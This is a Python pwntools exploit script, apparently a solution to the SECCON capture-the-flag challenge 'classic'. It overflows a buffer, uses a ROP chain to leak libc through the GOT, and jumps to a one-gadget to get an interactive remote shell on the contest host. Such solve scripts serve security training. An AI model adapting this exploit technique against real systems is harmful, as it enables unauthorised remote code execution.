from pwn import *

HOST = "classic.pwn.seccon.jp"
PORT = 17354
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('13.125.131.113',PORT)
s.recvuntil(">>")
gadget1 = 0x0000000000400753 # pop rdi ; ret
dat = "A"*0x48
dat += p64(gadget1)
dat += p64(0x00601030)
dat += p64(0x00400540)
dat += p64(gadget1)
dat += p64(0x601028)
dat += p64(0x00400560)
dat += p64(0x00400540)
s.sendline(dat)
libc = u64(s.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x20740
print hex(libc)
s.sendline(p64(libc+0x4526a))
s.interactive()
